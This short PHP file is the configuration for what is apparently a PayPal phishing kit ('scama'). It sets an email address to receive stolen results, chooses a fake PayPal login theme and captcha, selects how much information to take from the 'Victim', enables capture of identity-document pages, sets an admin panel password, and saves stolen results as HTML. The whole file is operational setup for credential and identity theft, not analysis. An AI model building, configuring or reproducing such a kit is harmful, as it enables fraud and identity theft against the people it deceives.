<?php

error_reporting(E_ERROR | E_PARSE);

/*   
  EDITED BY xXXx.BLVD >> FB.com/xXXx.BLV                   
*/
$Z119_EMAIL = "nullsyspam@protonmail.com"  ; 

// For use the old login Theme put 'old', for the new login Theme put 'new'. >Defult is New<
 
 $login_theme = "old";

// Use "yes" Or "no" for using paypal capatcha 

$use_capatcha = "yes" ;

// Use "select" To let the Victim choose way to confirm and "full" to get full information

$XV_SELECT = "select";

// Use "x1" for using 1 ID page And "x3" for Using 3 ID page

$Red_identity = "x3" ;

// ADMIN PASSWORD  PATH >> sacama_path + /ADMIN-XV3

$XV_PASS = "blvd" ; // enter your password here 

// USe "yes" For Save RZLT as HTML and "no" if i don't need to Save it 

$Save_RZLTS = "yes" ;


?>
